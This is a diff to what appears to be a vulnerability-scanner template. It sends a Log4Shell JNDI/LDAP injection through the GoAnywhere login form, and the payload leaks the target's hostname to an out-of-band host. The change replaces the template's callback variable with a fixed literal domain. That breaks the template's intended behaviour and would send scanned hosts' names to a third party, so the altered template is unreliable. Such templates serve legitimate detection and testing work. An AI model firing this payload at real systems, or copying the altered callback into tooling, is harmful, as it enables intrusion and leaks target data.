@@ -35,7 +35,7 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/goanywhere/auth/Login.xhtml
 
-        formPanel%3AloginGrid%3Aname=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.name.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
+        formPanel%3AloginGrid%3Aname=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.name.interactsh-url.com}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
 
     matchers-condition: and
     matchers:
